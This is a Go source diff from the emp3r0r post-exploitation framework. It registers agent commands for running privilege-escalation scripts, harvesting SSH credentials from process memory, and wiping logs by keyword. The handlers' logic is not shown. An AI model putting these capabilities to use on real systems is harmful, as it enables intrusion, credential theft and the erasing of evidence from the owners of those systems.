@@ -6,20 +6,49 @@ package handler
 import (
 	"encoding/hex"
 	"fmt"
-	"os"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/spf13/cobra"
 )
 
-// runGetRootLinux implements: !get_root
-func runGetRootLinux(cmd *cobra.Command, args []string) {
-	if os.Geteuid() == 0 {
-		c2transport.NotifyC2(cmd, "%s", "Warning: You already have root!")
-	} else {
-		c2transport.NotifyC2(cmd, "%s", "Deprecated")
+func platformCommands(cmd *cobra.Command) {
+	// !lpe --script_name <script_name> --checksum <checksum>
+	lpeCmd := &cobra.Command{
+		Use:     def.C2CmdLPE,
+		Short:   "Run LPE script",
+		Example: "!lpe --script_name <script_name> --checksum <checksum>",
+		GroupID: "generic",
+		Run:     runLPELinux,
 	}
+	lpeCmd.Flags().StringP("script_name", "s", "", "Script name")
+	lpeCmd.Flags().StringP("checksum", "c", "", "Checksum")
+	cmd.AddCommand(lpeCmd)
+
+	// !ssh_harvester --code_pattern <hex> --reg_name <register> --stop <bool>
+	sshHarvesterCmd := &cobra.Command{
+		Use:     def.C2CmdSSHHarvester,
+		Short:   "Start SSH harvester",
+		Example: "!ssh_harvester --code_pattern <hex> --reg_name <reg> --stop <bool>",
+		GroupID: "generic",
+		Run:     runSSHHarvesterLinux,
+	}
+	sshHarvesterCmd.Flags().StringP("code_pattern", "p", "", "Code pattern")
+	sshHarvesterCmd.Flags().StringP("reg_name", "r", "RBP", "Register name")
+	sshHarvesterCmd.Flags().BoolP("stop", "s", false, "Stop the harvester")
+	cmd.AddCommand(sshHarvesterCmd)
+
+	// !clean_log --keyword <keyword>
+	cleanLogCmd := &cobra.Command{
+		Use:     def.C2CmdCleanLog,
+		Short:   "Clean logs",
+		Example: "!clean_log --keyword <keyword>",
+		GroupID: "linux",
+		Run:     runCleanLogLinux,
+	}
+	cleanLogCmd.Flags().StringP("keyword", "k", "", "Keyword to clean logs")
+	cmd.AddCommand(cleanLogCmd)
 }
 
 // runCleanLogLinux implements: !clean_log --keyword <keyword>
